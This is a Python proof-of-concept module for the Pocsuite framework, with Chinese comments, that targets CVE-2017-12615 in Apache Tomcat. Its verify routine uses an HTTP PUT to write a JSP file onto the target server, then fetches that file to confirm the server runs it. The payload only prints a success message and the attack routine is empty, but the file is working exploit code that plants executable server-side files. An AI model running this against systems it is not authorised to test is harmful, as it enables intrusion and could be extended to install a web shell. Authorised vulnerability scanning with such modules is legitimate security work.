#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Copyright (c) 2014-2015 pocsuite developers (http://seebug.org)
See the file 'docs/COPYING' for copying permission
"""
#命令行
from pocsuite import pocsuite_cli
#验证模块
from pocsuite import pocsuite_verify
#攻击模块
from pocsuite import pocsuite_attack
#控制台模式
from pocsuite import pocsuite_console
#requests 
from pocsuite.api.request import req
#register
from pocsuite.api.poc import register
#report
from pocsuite.api.poc import Output, POCBase
#url转换host
from pocsuite.lib.utils.funs import url2ip



#基础基类
#fastcgi
class TomcatuploadPOC(POCBase):
    vulID = '42'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1' #默认为1
    vulDate = '2018-07-24' #漏洞公开的时间,不知道就写今天

    author = 'arr0w1' #  PoC作者的大名
    createDate ='2018-07-24'# 编写 PoC 的日期
    updateDate = '2018-07-24'# PoC 更新的时间,默认和编写时间一样
    references = ['']# 漏洞地址来源,0day不用写
    name = 'Tomcat uploadfile vulnerability'# PoC 名称
    appPowerLink = 'https://nvd.nist.gov/vuln/detail/CVE-2017-12615'# 漏洞厂商主页地址
    appName = 'Tomcat'# 漏洞应用名称
    appVersion = 'all versions'# 漏洞影响版本
    vulType = 'file-upload'#漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
    Tomcat uploadfile vulnerability，CVE-2017-12615
    ''' # 漏洞简要描述
    samples = []# 测试样列,就是用 PoC 测试成功的网站
    install_requires = [] # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    cvss = u"严重" #严重,高危,中危,低危

    #指纹方法
    def _fingerprint(self):
        pass


    def _verify(self):
        #ip = self.url.split(':')[1].replace('/', '')
        #import psycopg2
        testurl = (self.url+'/myfile.jsp/').replace('//m','/m')
        testdata = """<% out.write("<html><body><h3>[+] JSP upload successfully.</h3></body></html>"); %>"""
        result={}
        output = Output(self)
        message = ''

        print (testurl)
        try:
            r1 = req.put(testurl, testdata,timeout = 3)#3秒超时

            r2 = req.get(testurl.replace(".jsp/",".jsp"))

            print ('响应包长度：')
            print (r2.content.__len__())

            if  r2.content.find('successfully.') > 0:

                message = testurl + 'Tomcat uploadfile vulnerability'
                print(message)

                result['VerifyInfo'] = {}

                result['VerifyInfo']['url'] = testurl
                result['VerifyInfo']['Payload'] = testdata

                print '%s is vulnerable!' % testurl
                return True
            else:
                print '没有发现关键字：successfully. '
                return False

        except Exception as e:
            print '连接失败'
            pass

        return self.save_output(result)


    #攻击模块
    def _attack(self):
        pass

    #输出报告
    def save_output(self, result):
        #判断有无结果并输出
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail()
        return output


#注册类
register(TomcatuploadPOC)